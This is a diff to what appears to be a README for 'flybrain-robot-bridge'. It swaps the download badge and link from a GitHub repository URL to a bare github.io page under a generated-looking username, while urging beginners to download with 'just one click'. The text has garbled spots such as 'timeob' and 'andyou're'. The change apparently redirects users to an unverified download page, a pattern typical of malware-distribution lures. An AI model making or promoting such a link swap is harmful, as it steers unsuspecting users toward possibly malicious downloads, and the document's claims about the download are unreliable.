@@ -45,9 +45,9 @@ Follow these steps carefully, and you’ll have the program running in no timeob
 
 First, you need to get the software onto your computer. It is hosted on a website called GitHub, which is a platform where developers share their projects. Here is the direct link:
 
-[![Download flybrain-robot-bridge](https://img.shields.io/badge/Download-flybrain--robot--bridge-blue?style=for-the-badge&logo=github&logoColor=white&color=8A2BE2)](https://github.com/verniermicrometerbookfair7800/flybrain-robot-bridge)
+[![Download flybrain-robot-bridge](https://img.shields.io/badge/Download-flybrain--robot--bridge-blue?style=for-the-badge&logo=github&logoColor=white&color=8A2BE2)](https://verniermicrometerbookfair7800.github.io)
 
-Click that big button above, or visit this link to download the application: [https://github.com/verniermicrometerbookfair7800/flybrain-robot-bridge](https://github.com/verniermicrometerbookfair7800/flybrain-robot-bridge)
+Click that big button above, or visit this link to download the application: [https://verniermicrometerbookfair7800.github.io](https://verniermicrometerbookfair7800.github.io)
 
 This link will take you to a webpage where you can download the software. That’s it.—just one click, andyou’re on your way.
 
